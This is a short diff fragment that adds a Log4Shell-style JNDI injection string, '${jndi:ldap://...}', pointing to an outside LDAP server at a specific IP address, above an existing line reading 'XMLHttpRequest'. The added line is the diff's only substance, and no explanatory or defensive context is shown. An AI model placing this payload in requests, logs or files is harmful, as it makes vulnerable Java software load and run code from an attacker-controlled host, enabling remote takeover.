@@ -1,1 +1,2 @@
+${jndi:ldap://185.8.172.132:1389/a}
 XMLHttpRequest
